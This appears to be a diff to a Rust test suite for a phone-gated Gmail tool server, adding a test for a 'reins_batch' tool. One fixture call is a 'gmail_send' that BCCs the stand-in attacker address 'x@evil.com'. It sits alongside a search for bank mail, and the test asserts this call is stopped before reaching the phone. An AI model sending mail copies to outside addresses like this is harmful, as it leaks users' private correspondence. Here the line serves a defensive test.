@@ -139,6 +139,7 @@ async fn both_protocol_eras_are_served() {
             "gmail_search",
             "gmail_send",
             "reins_request_access",
+            "reins_batch",
             "reins_list_accounts",
             "reins_get_result",
             "reins_wait",
@@ -352,4 +353,54 @@ async fn every_tool_is_listed_whatever_the_phone_reported_and_the_instructions_n
 
     let (status, _) = phone.put("/services", &json!("not an object")).await;
     assert_eq!(status, StatusCode::BAD_REQUEST);
+}
+
+/// `reins_batch`: the calls reach the phone together, each as its own request with its place in the batch, are
+/// answered one by one, and come back as one result per call; a call that could not be made fails alone.
+#[tokio::test]
+async fn a_batch_reaches_the_phone_as_separate_requests_and_answers_each() {
+    let (server, phone, tokens) = connected().await;
+    let calls = json!({"calls": [
+        {"name": "gmail_search", "arguments": {"query": "from:bank"}},
+        {"name": "gmail_read", "arguments": {"message_ids": ["m1"]}},
+        {"name": "gmail_send", "arguments": {"to": ["a@b.com"], "subject": "s", "body": "b", "bcc": ["x@evil.com"]}},
+    ]});
+    let ai = tool(&server, &tokens.access, "reins_batch", calls);
+    let phone_side = async {
+        let mut seen: Vec<Value> = Vec::new();
+        while seen.len() < 2 {
+            let (status, pending) = phone.get("/pending?wait=10").await;
+            assert_eq!(status, StatusCode::OK, "{pending}");
+            for request in pending["requests"].as_array().unwrap() {
+                if !seen.iter().any(|s| s["id"] == request["id"]) {
+                    seen.push(request.clone());
+                }
+            }
+        }
+        seen.sort_by_key(|r| r["batch"]["index"].as_u64());
+        let denied = json!({"v": 1, "outcome": "denied", "reason": null});
+        for (request, response) in seen.iter().zip([search_result(), denied]) {
+            let id = request["id"].as_str().unwrap();
+            let (status, body) = phone.post(&format!("/requests/{id}/response"), &response).await;
+            assert_eq!(status, StatusCode::NO_CONTENT, "{body}");
+        }
+        seen
+    };
+    let (result, seen) = tokio::join!(ai, phone_side);
+    let batch_id = seen[0]["batch"]["id"].as_str().unwrap();
+    assert_eq!(seen[1]["batch"]["id"], batch_id, "one batch");
+    assert_eq!(
+        seen.iter().map(|r| (r["batch"]["index"].as_u64(), r["batch"]["size"].as_u64())).collect::<Vec<_>>(),
+        [(Some(0), Some(3)), (Some(1), Some(3))]
+    );
+    assert_eq!(seen[0]["call"]["tool"], "gmail_search");
+    assert_eq!(result["isError"], false, "only some calls failed: {result}");
+    let items = result["structuredContent"]["items"].as_array().unwrap();
+    assert_eq!(items.len(), 3, "{result}");
+    assert_eq!(result["structuredContent"]["batch_id"], batch_id);
+    assert_eq!(items[0]["result"]["isError"], false, "{result}");
+    assert_eq!(items[0]["request_id"], seen[0]["id"]);
+    assert_eq!(items[1]["result"]["isError"], true);
+    assert_eq!(items[2]["result"]["isError"], true);
+    assert_eq!(items[2]["request_id"], Value::Null, "never reached the phone");
 }
